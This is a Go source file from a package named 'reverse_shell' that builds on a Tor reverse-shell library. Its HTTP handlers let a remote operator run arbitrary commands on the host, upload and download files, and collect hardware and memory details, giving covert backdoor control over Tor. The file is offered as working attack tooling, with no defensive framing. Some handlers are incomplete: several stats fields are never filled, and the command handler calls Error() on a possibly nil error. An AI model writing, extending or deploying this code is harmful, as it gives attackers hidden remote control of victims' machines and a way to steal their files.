package reverse_shell

import (
	"net/http"
	"os/exec"
	"time"

	"github.com/humbertovnavarro/tor-reverse-shell/pkg/tor"
	"github.com/jaypipes/ghw"
	"github.com/jaypipes/ghw/pkg/cpu"
	"github.com/jaypipes/ghw/pkg/gpu"
	"github.com/mackerelio/go-osstat/memory"
)

var startTime = time.Now()

type HttpHandleFunc = func(http.ResponseWriter, *http.Request)

type UploadPost struct {
	Path string `json:"path"`
	To   string `json:"to"`
}

func handleUpload(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		uploadPost := &UploadPost{}
		err := ParseJSONBody(r, uploadPost)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		c.UploadFile(uploadPost.Path, uploadPost.To)
	}
}

type DownloadPost struct {
	Path string `json:"path"`
	From string `json:"from"`
}

func handleDownload(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		downloadPost := &DownloadPost{}
		err := ParseJSONBody(r, downloadPost)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		c.DownloadFile(downloadPost.Path, downloadPost.From)
	}
}

type CommandPost struct {
	Executable string   `json:"executable"`
	Args       []string `json:"args"`
}

type CommandPostResponse struct {
	Output string `json:"output"`
	Error  string `json:"error"`
}

func handleCommand(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()
		command := &CommandPost{}
		err := ParseJSONBody(r, command)
		if err != nil {
			ErrorBadRequest(w)
			return
		}
		cmd := exec.Command(command.Executable, command.Args...)
		output, err := cmd.Output()
		outputResp := &CommandPostResponse{
			Output: string(output),
			Error:  err.Error(),
		}
		err = WriteJSON(w, outputResp)
		if err != nil {
			ErrorInternal(w)
			return
		}
	}
}

type HardwareStats struct {
	GPU       *gpu.Info          `json:"gpu"`
	CPU       *cpu.Info          `json:"cpu"`
	Baseboard *ghw.BaseboardInfo `json:"motherboard"`
	Bios      *ghw.BIOSInfo      `json:"bios"`
	Blocks    *ghw.BlockInfo     `json:"drives"`
}

func handleHardwareStats(c *tor.TorContext) HttpHandleFunc {
	gpu, _ := ghw.GPU()
	cpu, _ := ghw.CPU()
	baseBoard, _ := ghw.Baseboard()
	bios, _ := ghw.BIOS()
	blocks, _ := ghw.Block()
	return func(w http.ResponseWriter, _ *http.Request) {
		stats := &HardwareStats{
			CPU:       cpu,
			GPU:       gpu,
			Baseboard: baseBoard,
			Bios:      bios,
			Blocks:    blocks,
		}
		WriteJSON(w, stats)
	}
}

type LiveStats struct {
	Uptime   int64   `json:"uptime"`
	MemFree  uint64  `json:"mem_free"`
	MemUsed  uint64  `json:"mem_used"`
	MaxMem   uint64  `json:"max_mem"`
	CPUUsage float32 `json:"cpu_usage"`
}

func handleLiveStats(c *tor.TorContext) HttpHandleFunc {
	return func(w http.ResponseWriter, _ *http.Request) {
		stats := &LiveStats{}
		memory, err := memory.Get()
		if err == nil {
			stats.MaxMem = memory.Total
			stats.MemFree = memory.Total - memory.Used

		}
		WriteJSON(w, stats)
	}
}
